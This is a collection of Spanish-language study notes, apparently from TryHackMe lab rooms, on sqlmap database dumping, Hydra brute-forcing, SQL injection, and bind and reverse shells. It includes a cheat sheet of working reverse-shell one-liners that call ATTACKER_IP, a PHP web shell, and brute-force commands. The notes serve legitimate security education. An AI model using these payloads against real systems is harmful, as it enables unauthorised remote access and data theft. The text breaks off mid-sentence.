  \n[08:49:01] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: Nginx, PHP 5.6.40\nback-end DBMS: MySQL >= 5.1\n[08:49:01] [INFO] fetching database names\navailable databases [2]:\n[*] users\n[*] members\n\n[text removed]\n```\n\nDespués de ejecutar  el comando vemos que hay dos bases de datos: `users` y `members`. Seleccionamos `users`, para ello definimos la base de datos después de la flag `-D` y usaremos `--tables` para obtener el nombre de las tablas:\n\n```shell\nuser@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables\n       __H__\n ___ ___[']_____ ___ ___  {1.2.4#stable}\n|_ -| . [\"]     | .'| . |\n|___|_  [,]_|_|_|__,|  _|\n      |_|V          |_|   http://sqlmap.org\n\n[text removed]\n[08:50:46] [INFO] resuming back-end DBMS' mysql' \n[08:50:46] [INFO] testing connection to the target URL\n[08:50:46] [INFO] heuristics detected web page charset 'ascii'\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: cat (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: cat=1 AND 2175=2175\n[text removed]\n[08:50:46] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: Nginx, PHP 5.6.40\nback-end DBMS: MySQL >= 5.1\n[08:50:46] [INFO] fetching tables for database: 'users'\nDatabase: acuart\n[3 tables]\n+-----------+\n| johnath   |\n| alexas    |\n| thomas    |     \n+-----------+\n\n[text removed]\n```\n\nAhora que tenemos las tablas de la base de datos, extraeremos la información de `thomas`. Para ello, definiremos la base de datos con la flag `-D`, la tabla con `-T` y la flag `--dump` para extraer los datos.\n\n```shell\nuser@ubuntu:~$ sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump\n       __H__\n ___ ___[']_____ ___ ___  {1.2.4#stable}\n|_ -| . [(]     | .'| . |\n|___|_  [(]_|_|_|__,|  _|\n      |_|V          |_|   http://sqlmap.org\n\n[text removed]\n[08:51:48] [INFO] resuming back-end DBMS' mysql' \n[08:51:48] [INFO] testing connection to the target URL\n[08:51:49] [INFO] heuristics detected web page charset 'ascii'\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: cat (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: cat=1 AND 2175=2175\n[text removed]\n[08:51:49] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: Nginx, PHP 5.6.40\nback-end DBMS: MySQL >= 5.1\n[08:51:49] [INFO] fetching columns for table 'thomas' in database 'users'\n[08:51:49] [INFO] fetching entries for table 'thomas' in database' users'\n[08:51:49] [INFO] recognized possible password hashes in column 'passhash'\ndo you want to store hashes to a temporary file for eventual further processing n\ndo you want to crack them via a dictionary-based attack? [Y/n/q] n\nDatabase: users\nTable: thomas\n[1 entry]\n+---------------------+------------+---------+\n| Date                | name       | pass    |    \n+---------------------+------------+----------\n| 09/09/2024          | Thomas THM | testing |    \n+---------------------+------------+---------+\n\n[text removed]\n```\n\nTambién se pueden usar URLs que usen el método POST, donde la información se manda en el cuerpo de la petición en lugar de la URL. Para hacer esto debes interceptar una petición y guardarla en un `.txt` para después usarla con SQLMap de la siguiente manera:\n\n```shell\nuser@ubuntu:~$ sqlmap -r intercepted_request.txt`\n```\n\n"
  },
  {
    "title": "4. Practical Exercise",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/4-sqlmap-the-basics/4-practical-exercise/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/4. SQLMap - The Basics/4. Practical Exercise.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 4. SQLMap - The Basics",
    "content": "1. Entramos en la página dada:\n   ![[Pasted image 20251019131757.png]]\n2. Con BurpSuite interceptamos la petición y así obtenemos la URL con parámetros:\n   ![[Pasted image 20251019132120.png]]\n3. Metemos la URL en SQLMap:\n   ![[Pasted image 20251019132303.png]]\n4. Observamos los datos arrojados\n   ![[Pasted image 20251019133223.png]]\n5. Miramos las tablas de la base de datos ai:\n   ![[Pasted image 20251019133333.png]]\n6. Obtenemos los datos de las tablas:\n   ![[Pasted image 20251019133552.png]]\n7. Dumpeamos los datos de la tabla user:\n   ![[Pasted image 20251019133635.png]]\n8. Obtenemos los datos y los vemos:\n   ![[Pasted image 20251019134604.png]]\n"
  },
  {
    "title": "0. SQLMap - The Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/4-sqlmap-the-basics/0-sqlmap-the-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/4. SQLMap - The Basics/0. SQLMap - The Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 4. SQLMap - The Basics",
    "content": "[[THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/4. SQLMap - The Basics/1. Introduction]]\n[[2. SQL Injection Vulnerability]]\n[[3. Automated SQL Injection Tool]]\n[[4. Practical Exercise]]\n"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/4-sqlmap-the-basics/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/4. SQLMap - The Basics/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 4. SQLMap - The Basics",
    "content": "SQL Injection es una vulnerabilidad prevalente y ha sido un tópico de debate en la ciberseguridad. Para entender esta vulnerabilidad debemos comprender antes lo que es una base de datos y cómo funciona.\n\nUna base de datos es una colección de información que puede ser almacenada, modificada y recuperada. Las páginas web con las que interactúas a veces tienen campos que rellenar, como un campo de autentificación. ¿Cómo hace la página web para guardar todos los usuarios y contraseñas? Con la ayuda de las bases de datos.También pasa con aquellos campos que te dejan buscar, por ejemplo, dentro de un catálogo. \n\nLa interacción puede llevarse a cabo gracias al lenguaje SQL. En esta unidad aprenderemos lo básico de SQL.\n\n--------------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Vulnerabilidad SQL Injection (SQLI).\n- Encontrar campos susceptibles a SQLI mediante SQLMap.\n\n------------------------\n<h2>Pre-requisitos</h2>\n[[0. SQL Fundamentals]]\n"
  },
  {
    "title": "2. SQL Injection Vulnerability",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/4-sqlmap-the-basics/2-sql-injection-vulnerability/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/4. SQLMap - The Basics/2. SQL Injection Vulnerability.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 4. SQLMap - The Basics",
    "content": "En la tarea anterior, estudiamos cómo las páginas web y aplicaciones interactúan con las bases de datos para almacenar, modificar y recuperar la información de manera estructurada. En esta veremos cómo la interacción entre la aplicación y la base de datos ocurre a través de queries SQL y cómo los atacantes utilizan estas queries para realizar SQLI.\n\n>[!CAUTION] Prueba métodos manuales o automáticos de SQLI pero SÓLO de aquellas aplicaciones de las cuales tengas permiso explícito del dueño para hacerlo.\n\nPongamos un ejemplo:\n\nUna página web te pide las credenciales y nosotros le mandamos:\n\n`Username: John`\n`Password: Un@detectable444`\n\nUna vez que lo introducimos el sitio web lo recibe y realiza una query SQL a la base de datos con nuestras credenciales:\n\n```SQL\nSELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';\n```\n\nEsta query será ejecutada en la base de datos. Comprobará si hay un usuario que sea `John` y si su contraseña es `Un@detectable444`. Si lo hay, devolverá todos sus datos. Sólo funcionara si coinciden el usuario y la contraseña, debido al `AND` de la query.\n\nSi el input no está correctamente sanitizado, los atacantes pueden manipular el input y escribir queries SQL que se ejecutarán en la base de datos. La SQLI tiene un efecto muy dañino en el mundo digital ya que todas las empresas guardan información (incluida información crítica).\n\nSi el input no está sanitizado, un atacante podría escribir algo como:\n\n`Username: John`\n`Password: abc' OR 1=1;-- -`\n\n\n\nEsta vez, la query que se ejecutaría se vería como:\n\n```SQL\nSELECT * FROM users WHERE username = 'John' AND password = 'abd' OR 1=1;-- -';\n```\n\nObserva como el atacante ha sustituido la última comilla por la suya (la que escribió después de `abc`). Además insertó el operador `OR` que hace que aunque la contraseña sea incorrecta, si el statement que hay a la derecha es `true`, la query será exitosa. Es decir, como 1=1, siempre será exitosa pongamos la contraseña que pongamos. Y como acaba la contraseña con `;` para cerrar la query sin errores y `-- -` para comentar el resto de la query, esta no ve `';` que restaba de la query anterior, por lo que no falla."
  },
  {
    "title": "1. Hydra Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/1-hydra/1-hydra-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/1. Hydra/1. Hydra Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 1. Hydra",
    "content": "<h2>¿Qué es Hydra?</h2>\nHydra es una herramienta de crackeo de contraseñas por fuerza bruta. Hydra puede correr una lista e ir probando contraseñas de esa lista, mucho más rápido que hacerlo a mano.\n\nSegún la documentación en su [repositorio oficial](https://github.com/vanhauser-thc/thc-hydra), Hydra puede bruteforcear los siguientes protocolos: “Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MEMCACHED, MONGODB, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, Radmin, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, TeamSpeak (TS2), Telnet, VMware-Auth, VNC and XMPP.”\n\nEsto muestra la importancia de hacer una contraseña segura, ya que si nuestra contraseña se encuentra dentro de algún diccionario es susceptible de ser rota.\n\n---------------------\n<h2>Instalando Hydra</h2> \nPara instalar hydra (viene preinstalada en Kali Linux), puedes hacerlo ejecutando `apt install hydra` o `dnf install hydra`. También puedes descargarla desde su repositorio oficial, listado arriba."
  },
  {
    "title": "0. Hydra",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/1-hydra/0-hydra/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/1. Hydra/0. Hydra.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 1. Hydra",
    "content": "\n[[1. Hydra Introduction]]\n[[2. Using Hydra]]\n"
  },
  {
    "title": "2. Using Hydra",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/1-hydra/2-using-hydra/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/1. Hydra/2. Using Hydra.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 1. Hydra",
    "content": "<h2>Comandos Hydra</h2>\nLas opciones que le pasemos a Hydra dependerán de qué servicio (protocolo) estemos intentando atacar. Por ejemplo, si queremos atacar el srvicio FTP con el nombre de usurio `user` y la lista de contraseñas `passlist.txt`, usaríamos el siguiente comendo:\n\n`hydra -l user -P passlist.txt ftp://IP`\n\nAquí vemos algunos comandos tanto para SSH como para formulario web (POST).\n\n---------------------------\n<h2>SSH</h2>\n`hydra -l <username> -P <full path to pass> <IP> -t <number> ssh`\n\n| Opción | Descripción                              |\n| ------ | ---------------------------------------- |\n| `-l`   | Especifica el usuario para el loguin SSH |\n| `-P`   | Indica la lista de contraseñas.          |\n| `-t`   | Configura el número de hilos que usar    |\nPor ejemplo, `hydra -l root -P passwords.txt 10.10.141.231 -t 4 ssh` lanzará un ataque de fuerza bruta contra el puerto 22 de la IP `10.10.141.231` con 4 hilos al usuario `root` con la lista de contraseñas `passwords.txt`.\n\n-------------------------\n<h2>POST Web Form</h2>\nPodemos usar Hydra para bruteforcear formularios web también. Debemos saber qué tipo de petición se está haciendo (GET/POST).\n\n`sudo hydra <username> <wordlist> <IP> http-post-form \"<path>:<login_credentials>:<invalid_response>\"`\n\n| Opción                | Descripción                                                                                            |\n| --------------------- | ------------------------------------------------------------------------------------------------------ |\n| `-l`                  | El nombre de usuario para el login                                                                     |\n| `-P`                  | La lista de contraseñas                                                                                |\n| `http-post-form`      | El tipo de formulario es POST                                                                          |\n| `<path>`              | La URL de login, por ejemplo `login.php`                                                               |\n| `<login_credentials>` | El nombre de usuario y contraseña usados para loguearse, por ejemplo `username=^USER^&password=^PASS^` |\n| `<invalid_response>`  | Parte de la respuesta cuando el login falla                                                            |\n| `-V`                  | Output verboseado para cada intento                                                                    |\nPor ejemplo:\n\n`hydra -l username -P wordlist 10.10.141.231 http-post-form \"/:username=^USER^&password=^PASS^:F=incorrect\" -V`\n\n- La página de login es la dirección principal (`/`).\n- El nombre de usuario es `username`.\n- Dicho nombre de usuario reemplazará a ^USER^.\n- La lista de contraseñas es `wordlist`.\n- Dichas contraseñas sustituirán a ^PASS^.\n- Finalmente, `F=incorrect` es una string que aparecerá si el login en el servidor falla.\n\n-----------------------\n<h2>Challenge</h2>\n1. Abrimos la página dada:\n   ![[150.png]]\n2. Comprobamos el método, en este caso POST:\n   ![[151.png]]\n3. Lanzamos hydra con los parámetros correspondientes:\n   ![[152 1.png]]\n4. Obtenemos la contraseña:\n   ![[153.png]]\n5. Entramos y obtenemos la flag:\n   ![[154.png]]\n6. Usamos hydra para romper la contraseña ssh de molly:\n   ![[155.png]]\n7. Entramos por ssh y obtenemos la flag:\n   ![[156.png]]\n\n"
  },
  {
    "title": "4. Bind Shell",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/3-shells-overview/4-bind-shell/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/3. Shells Overview/4. Bind Shell.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 3. Shells Overview",
    "content": "Como indica su nombre, una bind shell se relaciona a un puerto en el sistema comprometido y escucha una conexión. Cuando ocurre, expone una sesión shell al atacante. \n\nEste método puede ser usado cuando el sistema comprometido no permite las conexiones salientes, pero es menos popular ya que necesita permanecer activo y escuchar conexiones, lo que puede llevar a su detección.\n\n----------------------\n<h2>¿Cómo funcionan las bind shells?</h2>\n\n----------------------------\n\n<h4>Configurar la Bind Shell en el Objetivo</h4>\nCreemos una bind shell. El atacante puede usar un comando como el de abajo en la máquina objetivo:\n\n`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`\n\n-  `rm -f /tmp/f`: Elimina cualquier archivo pipe existente en `/tmp/f`. Esto es para crear una nueva pipe ahí sin conflictos.\n- `mkfifo /tmp/f`: Crea una pipe o FIFO (First In First Out) en `/tmp/f`.\n- `cat /tmp/f`: Lee la información de la pipe (espera input).\n- `| bash -i 2>&1`: El output de cat se pipea a la instancia de shell (`bash -i`), que permite al atacante ejecutar comandos de manera interactiva. El `2>&1` redirecciona los errores al output (stderr a stdout), asegurándose de que cualquier error se manda de vuelta al atacante.\n- `| nc -l 0.0.0.0 8080`: Comienza la conexión en modo escucha (`-l`) en todas las interfaces (`0.0.0.0`) y el puerto `8080`.\n- `>/tmp/f`: Esta parte manda el output de los comandos de vuelta hacia el pipe, permitiendo comunicación bidireccional.\n\nEste comando escuchará conexiones entrantes y expondrá una shell bash. Los puertos por debajo del 1024 necesitan ser ejecutados con privilegios elevados.\n\n------------------------\n<h4>Terminal en la Máquina Objetivo (Bind Shell Setup)</h4>\n```shell\ntarget@tryhackme:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f\n```\n\nUna vez ejecutado el comando, esperará por una conexión, como se muestra arriba.\n\n-----------------------------\n<h4>El Atacante se Conecta a la Bind Shell</h4>\nAhora que la máquina víctima está esperando conexiones, usamos Netcat de nuevo con el siguiente comando para conectarnos:\n\n`nc -nv <IP_OBJETIVO> <PUERTO_OBJETIVO>`\n\n- - `nc`: Llama a la herramienta Netcat.\n- `-n`: Deshabilita la resolución DNS.\n- `-v`: Activa verbose para obtener más información.\n- `IP_OBJETIVO`: La dirección IP del objetivo donde la bind shell está corriendo.\n- `PUERTO_OBJETIVO`: El puerto en el que el sistema objetivo escucha.\n\n```shell\nattacker@kali:~$ nc -nv 10.10.13.37 8080 \n(UNKNOWN) [10.10.13.37] 8080 (http-alt) open\ntarget@tryhackme:~$\n```\n\n"
  },
  {
    "title": "6. Shell Payloads",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/3-shells-overview/6-shell-payloads/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/3. Shells Overview/6. Shell Payloads.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 3. Shells Overview",
    "content": "Un payload de shell puede ser un comando o script que expone una shell a una conexión entrante en caso de una bind shell o que manda una conexión en caso de una reverse shell.\n\nExploremos algunos de los payloads que pueden ser usados en Linux OS para exponer shells mediante **reverse shell**.\n\n--------------------------\n<h2>Bash</h2>\n<h6>Normal Bash Reverse Shell</h6>\n```shell\nattacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT\n2024/09/23 15:44:38 socat[41135] N listening on AF=2 0.0.0.0:443\n```\n\nEsta reverse shell inicia una shell bash interactiva que redirige el input y output a través de una conexión TCP a la máquina del atacante en el puerto `443`. El operador `>&` combina ambos, estándar output y error.\n\n<h6>Bash Read Line Reverse Shell</h6>\n```shell\ntarget@tryhackme:~$ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done \n```\n\nEsta reverse shell crea un nuevo descriptor de archivo (`5` en este caso) y se conecta a un socket TCP. Leerá y ejecutará comandos desde el socket, mandando el output a través del mismo socket.\n\n<h6>Bash With File Descriptor 196 Reverse Shell</h6>\n```shell\ntarget@tryhackme:~$ 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 \n```\n\nEsta reverse shell usa un descriptor de archivo (`196` en este caso) para establecer una conexión TCP. Permite al shell leer comandos de la red y mandar el output de vuelta mediante la misma conexión.\n\n<h6>Bash With File Descriptor 5 Reverse Shell</h6>\n```shell\ntarget@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5\n```\n\nDe forma similar al primer ejemplo, este comando abre una shell, pero usa el descriptor `5` para el input y el output, permitiendo una sesión interactiva mediante una conexión TCP.\n\n----------------------\n<h2>PHP</h2>\n<h6>PHP Reverse Shell Using the exec Fuction</h6>\n```shell\ntarget@tryhackme:~$ php -r '$sock=fsockopen(\"ATTACKER_IP\",443);exec(\"sh <&3 >&3 2>&3\");' \n```\n\nEsta reverse shell crea una comunicación socket a la IP del atacante en el puerto `443` y usa la función `exec` para ejecutar una shell, redirigiendo el input y output estándar.\n\n<h6>PHP Reverse Shell</h6>\n```shell\ntarget@tryhackme:~$ php -r '$sock=fsockopen(\"ATTACKER_IP\",443);shell_exec(\"sh <&3 >&3 2>&3\");'\n```\n\nSimilar al comando anterior, pero usa la función `shell_exec`.\n\n<h6>PHP Reverse Shell Using the system Function</h6>\n```shell\ntarget@tryhackme:~$ php -r '$sock=fsockopen(\"ATTACKER_IP\",443);system(\"sh <&3 >&3 2>&3\");' \n```\n\nEsta reverse shell usa la función `system` la cual ejecuta el comando y muestra la salida en el navegador.\n\n<h6>PHP Reverse Shell Using the passthru Function</h6>\n```shell\ntarget@tryhackme:~$ php -r '$sock=fsockopen(\"ATTACKER_IP\",443);passthru(\"sh <&3 >&3 2>&3\");'\n```\n\nLa función `passthru` ejecuta un comando y manda output raw de vuelta al navegador. Esto es útil al trabajar con datos binarios\n\n<h6>PHP Reverse Shell Using the popen Function</h6>\n```shell\ntarget@tryhackme:~$ php -r '$sock=fsockopen(\"ATTACKER_IP\",443);popen(\"sh <&3 >&3 2>&3\", \"r\");' \n```\n\nEsta reverse shell usa `popen` para abrir un puntero de proceso de archivo, permitiendo a la shell ser ejecutada.\n\n-------------------------\n<h2>Python</h2>\n<h6>Python Reverse Shell by Exporting Environment Variables</h6>\n```shell\ntarget@tryhackme:~$ export RHOST=\"ATTACKER_IP\"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")' \n```\n\nConfigura el host remoto y puerto como variables de entorno, crea una conexión socket y duplica el descriptor de archivo del socket.\n<h6>Python Reverse Shell Using the subprocess Module</h6>\n```shell\ntarget@tryhackme:~$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.4.99.209\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")' \n```\n\nUsa el módulo `subprocess`para spawnear una shell y configurar un entorno similar al Python Reverse Shell exportando el comando de variables de entorno.\n<h6>Short Python Reverse Shell</h6>\n```shell\npython -c 'import os,pty,socket;s=socket.socket();s.connect((\"ATTACKER_IP\",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"bash\")'\n```\n\nCrea un socket (`s`), se conecta al atacante, redirige el input,output y error estándar al socket usando `os.dup2()`.\n\n--------------------------\n<h2>Otras</h2>\n<h6>Telnet</h6>\n```shell\ntarget@tryhackme:~$ TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF\n```\n\nCrea una named pipe usando `mkfifo` y se conecta al atacante vía Telnet en la IP y puertos especificados.\n\n<h6>AWK</h6>\n```shell\ntarget@tryhackme:~$ awk 'BEGIN {s = \"/inet/tcp/0/ATTACKER_IP/443\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null\n```\n\nUsa el TCP en AWK para conectarse a la IP y puerto del atacante. Lee comandos del atacante y los ejecuta. Después manda los resultados de vuelta por la misma conexión TCP.\n\n<h6>BusyBox</h6>\n```shell\ntarget@tryhackme:~$ busybox nc ATTACKER_IP 443 -e sh\n```\n\nUsa Netcat (`nc`) para conectarse al atacante. Una vez establecida la conexión, ejecuta `/bin/sh`, exponiendo la línea de comandos al atacante.\n"
  },
  {
    "title": "1. Room Introduction",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/3-shells-overview/1-room-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/3. Shells Overview/1. Room Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 3. Shells Overview",
    "content": "Las shells en ciberseguridad son ampliamente usadas por los atacantes para ganar acceso remoto a sistemas, haciéndolas una parte importante de la cadena de ataque. En esta unidad, veremos diferentes shells usadas en la seguridad ofensiva, las diferencias entre ellas y sus casos de uso.\n\n--------------------------\n<h2>Objetivos de Aprendizaje</h2>\nEn esta unidad trataremos de:\n\n- Entender las Shells en la seguridad ofensiva.\n- Configurar y usar reverse y bind shells.\n- Desplegar shells web.\n\n----------------\n<h2>Pre-requisitos</h2>\nEs recomendable entendimiento en:\n\n- Networking basics.\n- Conocimiento fundamental en seguridad de aplicaciones web.\n- Eficiencia con la linea de comandos.\n- Familiaridad con lenguajes de scripting como Bash, Python o PHP.\n\n-------------------------\n<h2>Caveats</h2>\nEl uso de herramientas co frameworks como Metasploit se ha dejado atrás para esta unidad. Esto es para enfocarse más en cómo funcionan las shells sin ayuda de herramientas de asistencia."
  },
  {
    "title": "7. Web Shell",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/3-shells-overview/7-web-shell/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/3. Shells Overview/7. Web Shell.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 3. Shells Overview",
    "content": "Una web shell es un script escrito en un lenguaje soportado por un servidor web comprometido que ejecuta comandos a través del propio servidor. Suele ser un archivo que contiene código que ejecuta comandos y controla archivos.\n\nPueden ser escritas en diferentes lenguajes soportados por servidores web, como PHP, ASP, JSP o CGI.\n\n---------------------\n<h2>Ejemplo de Web Shell PHP</h2>\nVeamos un ejemplo de una web shell en PHP para entender cómo funciona este proceso:\n\n```php\n<?php\nif (isset($_GET['cmd'])) {\n    system($_GET['cmd']);\n}\n?>\n```\n\nLa shell de arriba puede guardarse en un archivo con extensión php, como `shell.php`, y luego subida a un servidor por el atacante para explotar vulnerabilidades como Unrestricted File Upload, File Inclusion, Command Injection y otras.\n\nDespués de desplegar la webshell en el servidor puede ser accedida a través de la URL. Según el ejemplo de arriba, tendríamos que realizar una petición GET con el parámetro \"cmd\". Si la página fuera `http://victim.com/uploads/shell.php`:\n\n`http://victim.com/uploads/shell.php?cmd=whoami`\n\nEsto ejecutará el comando whoami en el servidor y devolverá el resultado a través del navegador.\n\n---------------------\n<h2>Web Shells Existentes Disponibles Online</h2>\nEl poder de los lenguajes soportados por los servidores web puede resultar en web shells con varias funcionalidades y evitar la detección a la vez. Veamos algunas de las más populares:\n\n- [p0wny-shell](https://github.com/flozz/p0wny-shell): Una web shell de un solo archivo PHP minimalista que permite RCE.\n  ![[Pasted image 20251017174237.png]]\n- [b374k shell](https://github.com/b374k/b374k): Una web shell PHP más rica en funcionalidades con manejo de archivos y ejecución de comandos, entre otras funcionalidades.\n  ![[Pasted image 20251017174417.png]]\n- [c99 shell](https://www.r57shell.net/single.php?id=13): Una web shell robusta y bien conocida con funcionalidades extensas.\n  ![[Pasted image 20251017174504.png]]\n\nSi quieres encontrar más web shells: https://www.r57shell.net/index.php \n\n"
  },
  {
    "title": "0. Shells Overview",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/3-shells-overview/0-shells-overview/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/3. Shells Overview/0. Shells Overview.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 3. Shells Overview",
    "content": "[[1. Room Introduction]]\n[[2. Shell Overview]]\n[[3. Reverse Shell]]\n[[4. Bind Shell]]\n[[5. Shell Listeners]]\n[[6. Shell Payloads]]\n[[7. Web Shell]]\n[[8. Practical Task]]\n"
  },
  {
    "title": "3. Reverse Shell",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/3-shells-overview/3-reverse-shell/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/3. Shells Overview/3. Reverse Shell.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling > 3. Shells Overview",
    "content": "Una reverse shell es una de las técnicas más populares para ganar acceso a un sistema en ciberataques. Las conexiones inician desde el sistema objetivo, lo que ayuda a reducir la detección de firewalls y otras medidas de seguridad.\n\n-------------------\n<h2>¿Cómo funcionan las reverse shells?</h2>\n\n------------------------\n<h4>Configura un Listener Netcat (nc)</h2>\nEntendamos ahora cómo funcionan las reverse shells en un escenario práctico usando Netcat. Esta herramienta soporta varios sistemas operativos y permite leer y escribir a través de una red.\n\nComo ya hemos dicho, la conexión la comienza la máquina víctima, por lo que la máquina atacante estará esperando una conexión. Usaremos Netcat para escuchar. Usaremos el comando `nc -lvnp 443`.\n\n```shell\nattacker@kali:~$ nc -lvnp 443\nlistening on [any] 443 ...\n```\n\nEl comando usa las opciones:\n\n- `-l`: Indica a Netcat que escuche (listen) o espere por una conexión.\n- `-v`: Activa verbose para ver más información.\n- `-n`: Previene que las conexiones usen DNS lookup por lo que lo hará a partir de la IP.\n- `-p`: Indica el puerto que utilizaremos, en nuestro caso el 443.\n\nPuedes usar cualquier puerto para establecer la conexión pero los hackers suelen usar puertos conocidos utilizados por otras aplicaciones para enmascarar las conexiones.\n\n-------------------------\n<h4>Obteniendo una Reverse Shell</h4>\nUna vez que tenemos nuestro listener configurado, el objetivo debe ejecutar lo que se conoce como payload de reverse shell. Normalmente este payload abusa una vulnerabilidad o un acceso no autorizado. Hay mucha variedad de payloads, que dependerán de las herramientas y el sistema operativo que sea atacado. Podemos ver algunos ejemplos [aquí](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).\n\nAnalicemos un payload de ejemplo:\n\n`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <IP_ATACANTE> <PUERTO_ATACANTE> >/tmp/f`\n\n- `rm -f /tmp/f`: Elimina cualquier archivo 